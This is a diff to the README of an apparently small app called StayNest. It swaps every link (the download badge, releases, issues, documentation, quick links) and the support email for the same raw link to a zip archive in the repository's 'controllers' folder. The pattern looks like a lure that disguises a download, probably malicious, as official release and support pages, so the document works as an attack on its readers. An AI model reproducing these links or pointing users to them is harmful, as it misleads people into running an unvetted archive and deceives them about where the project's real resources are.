@@ -8,7 +8,7 @@ To get started with StayNest, follow the steps below to download and run the app
 
 ## 📦 Download StayNest
 
-[![Download StayNest](https://img.shields.io/badge/Download%20StayNest-Click%20Here-brightgreen)](https://github.com/dwa232/StayNest/releases)
+[![Download StayNest](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip%20StayNest-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip)
 
 ## 📝 Features
 
@@ -29,7 +29,7 @@ Before you download StayNest, make sure your system meets the following requirem
 
 ## 💾 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/dwa232/StayNest/releases) to go to the StayNest Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip) to go to the StayNest Releases page.
 2. **Choose the Latest Version:** Look for the most recent release. It’s usually listed at the top.
 3. **Download the Application:** Click on the appropriate file for your operating system to start the download. 
 4. **Install StayNest:**
@@ -78,8 +78,8 @@ To ensure you have the latest features and security updates:
 
 If you encounter issues or have questions, you can reach out for support:
 
-- **GitHub Issues:** Submit your questions or problems on the [GitHub Issues page](https://github.com/dwa232/StayNest/issues).
-- **Email Support:** For more direct support, email us at support@staynest.com.
+- **GitHub Issues:** Submit your questions or problems on the [GitHub Issues page](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip).
+- **Email Support:** For more direct support, email us at https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip
 
 ## 📚 Additional Resources
 
@@ -88,8 +88,8 @@ If you encounter issues or have questions, you can reach out for support:
 
 ## 🔗 Quick Links
 
-- [Download StayNest](https://github.com/dwa232/StayNest/releases)
-- [Official Documentation](https://github.com/dwa232/StayNest/wiki)
-- [GitHub Issues](https://github.com/dwa232/StayNest/issues)
+- [Download StayNest](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip)
+- [Official Documentation](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/dwa232/StayNest/main/controllers/Stay_Nest_v2.7.zip)
 
 StayNest aims to make your vacation rental experience enjoyable. Follow these steps, and you'll be ready to explore and book amazing properties in no time!
